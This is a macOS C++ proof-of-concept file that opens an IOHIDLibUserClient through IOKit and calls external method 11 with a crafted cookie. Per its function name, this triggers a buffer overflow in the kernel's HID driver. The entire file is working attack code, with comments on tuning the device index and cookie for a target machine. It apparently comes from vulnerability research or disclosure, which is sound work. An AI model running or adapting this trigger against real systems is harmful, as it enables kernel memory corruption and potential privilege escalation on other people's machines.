// clang -o poc poc.cpp -framework CoreFoundation -framework IOKit -g -D_FORTIFY_SOURCE=0
// please read comments below

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <Kernel/libkern/sysctl.h>
#include <IOKit/IOKitLib.h>
#include <time.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/quota.h>


// this variable means which system loaded IOHIDDevice you want to select. you may need to change this value in your test machine after check output of ioreg -lxf on your machine.
int g_count = 2;

io_connect_t open_and_connect_user_client(char* service_name, int type) {
    kern_return_t err;
    io_connect_t conn = MACH_PORT_NULL;
    
    CFMutableDictionaryRef matching = IOServiceMatching(service_name);
    if(!matching){
        printf("unable to create service matching dictionary\n");
        return conn;
    }
    
    io_iterator_t iterator;
    err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
    if (err != KERN_SUCCESS){
        printf("no matches\n");
        return conn;
    }
    
    io_service_t service = IOIteratorNext(iterator);
    
    if (service == IO_OBJECT_NULL){
        printf("unable to find service\n");
        return conn;
    }
    int count = 0;
    while (count != g_count) {
        service = IOIteratorNext(iterator); // select a IOHIDDevice you want.
        count++;
    }
    printf("got service: %x\n", service);
    
    
    err = IOServiceOpen(service, mach_task_self(), type, &conn);
    if (err != KERN_SUCCESS){
        printf("unable to get user client connection %x\n", err);
        return MACH_PORT_NULL;
    }
    
    printf("got userclient connection: %x\n", conn);
    return conn;
}

void test_io_connect_method(io_connect_t conn, int selector, uint64_t* scalar_input,
                            uint32_t scalar_input_cnt,
                            unsigned char* struct_input, size_t struct_input_cnt, int scalar_output_cnt,
                            int struct_output_cnt) {

    uint64_t outputScalar[16];
    uint32_t outputScalarCnt = scalar_output_cnt;
    
    char outputStruct[4096];
    size_t outputStructCnt = struct_output_cnt;
    
    int index = selector;
    printf("IOConnectCall (selector = %d)\n", index);
    //getchar(); // can use this to help two machines debug
    kern_return_t err = IOConnectCallMethod(
                                            conn,
                                            index,
                                            scalar_input,
                                            scalar_input_cnt,
                                            struct_input,
                                            struct_input_cnt,
                                            outputScalar,
                                            &outputScalarCnt,
                                            outputStruct,
                                            &outputStructCnt);
    
    if (err != KERN_SUCCESS){
        printf("IOConnectCall (%d) error: %x\n", index, err);
    }
}


void trigger_HID_BufferOverflow() {
    io_connect_t conn = open_and_connect_user_client("IOHIDDevice", 0x00484944); // to get IOHIDLibUserClient
    uint64_t inputScalar[16] = {0};
    uint32_t inputScalarCnt = 1;  // only pass one cookie to the method
    
    unsigned char inputStruct[4096] = {0};
    size_t inputStructCnt = 0;

    inputScalar[0] = 350;  // the cookie is 350 in my machine, you may need check your InputReport element's cookie
    test_io_connect_method(conn, 11, inputScalar, inputScalarCnt, inputStruct, inputStructCnt, 0, 0);
}


int main(int argc, const char * argv[]) {
    trigger_HID_BufferOverflow();
    return 0;
}





